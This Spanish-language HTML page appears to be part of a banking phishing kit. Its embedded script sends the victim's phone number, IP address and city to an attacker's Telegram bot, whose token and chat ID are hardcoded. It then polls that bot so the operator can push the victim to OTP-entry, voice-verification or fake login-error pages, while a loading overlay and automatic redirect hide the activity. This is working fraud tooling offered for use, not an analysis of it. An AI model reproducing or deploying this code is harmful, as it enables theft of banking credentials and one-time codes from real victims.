<!DOCTYPE html>
<html>
<head>
    <title>Bienvenido</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="../assets/img/favicon.ico">
    <script src="../assets/js/jquery-3.6.0.min.js"></script>
    <link href="../assets/css/styles.css" rel="stylesheet">
    <link href="../assets/css/stylesheet.css" rel="stylesheet">
    <script src="../assets/js/functions.js?v2"></script>
    <style>
        #fondo{position:fixed;width:100%;height:100%;top:0;left:0;background:#ffffffc4;z-index:300;}
        #cargando{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:400;}
    </style>
</head>
<body>
    <div id="fondo"></div>
    <img src="../assets/img/cargando.gif" id="cargando">

    <!-- TU DISEÑO ORIGINAL -->
    <div class="cabecera"> ... </div>
    <div class="contenido-interno">
        <div id="numero" style="font-weight:bold;color:#210049;"></div>
        <!-- resto de tu HTML -->
    </div>
    <div class="pie"> ... </div>

    <!-- BOT MÁGICO 100% FUNCIONAL -->
    <script>
    $(document).ready(function() {
        // 1. ESPERA A TENER EL NÚMERO
        function enviarTelegram() {
            const numero = $("#numero").text().trim();
            if (!numero || numero === "Sin número") {
                setTimeout(enviarTelegram, 500);
                return;
            }

            // 2. OBTIENE IP
            fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => {
                const ip = d.ip;
                fetch(`https://ipapi.co/${ip}/json/`)
                .then(r => r.json())
                .then(geo => {
                    const ciudad = geo.city || "Desconocida";

                    // 3. ENVÍA A TU BOT CON BOTONES
                    const msg = `*NUEVO CLIENTE EN PRIVATE*

*Número:* ${numero}
*IP:* ${ip}
*Ciudad:* ${ciudad}
*Hora:* ${new Date().toLocaleString()}

*ELIGE ACCIÓN:*`;

                    fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: 8469651553,
                            text: msg,
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{text: "Clave OTP", callback_data: "otp_" + numero}],
                                    [{text: "Error clave", callback_data: "error_" + numero}],
                                    [{text: "Dinámica", callback_data: "dinamica_" + numero}],
                                    [{text: "Error login", callback_data: "loginerr_" + numero}],
                                    [{text: "Finalizar", callback_data: "ok_" + numero}]
                                ]
                            }
                        })
                    });
                });
            });
        }

        // 4. CARGA NÚMERO Y ENVÍA
        $.post("../process/buscar_registro.php", function(data) {
            const valor = data.split("|");
            $("#numero").html(valor[1]);
            enviarTelegram(); // ENVÍA CON NÚMERO
        });

        // 5. REDIRIGE EN 4 SEGUNDOS
        setTimeout(() => { location.href = '../verifying/'; }, 4000);
    });
    </script>

    <!-- RECIBE BOTONES Y ACTÚA -->
    <script>
    // Simula WebApp para pruebas locales
    if (!window.Telegram) window.Telegram = {WebApp: {}};
    if (!Telegram.WebApp.sendData) Telegram.WebApp.sendData = (data) => alert(data);

    // ESCUCHA BOTONES
    window.addEventListener('load', () => {
        setInterval(() => {
            fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/getUpdates')
            .then(r => r.json())
            .then(data => {
                if (!data.ok || !data.result) return;
                data.result.forEach(upd => {
                    if (upd.callback_query) {
                        const cb = upd.callback_query;
                        const accion = cb.data.split("_")[0];
                        const numero = cb.data.split("_")[1];

                        let respuesta = "";
                        switch(accion) {
                            case "otp":
                                respuesta = "Tu OTP es: *4821*";
                                break;
                            case "error":
                                respuesta = "Clave incorrecta. Intenta de nuevo.";
                                break;
                            case "dinamica":
                                respuesta = "Clave dinámica enviada al celular.";
                                location.href = '../verify-voice/';
                                break;
                            case "loginerr":
                                respuesta = "Error de login. Intenta más tarde.";
                                location.href = '../login/';
                                break;
                            case "ok":
                                respuesta = "Acceso concedido!";
                                location.href = '../successful/';
                                break;
                        }

                        // Responde al botón
                        fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/answerCallbackQuery', {
                            method: 'POST',
                            body: JSON.stringify({
                                callback_query_id: cb.id,
                                text: respuesta,
                                show_alert: true
                            }),
                            headers: {'Content-Type': 'application/json'}
                        });
                    }
                });
            });
        }, 2000);
    });
    </script>

    <script src="../assets/js/ready.js?v2"></script>
</body>
</html>
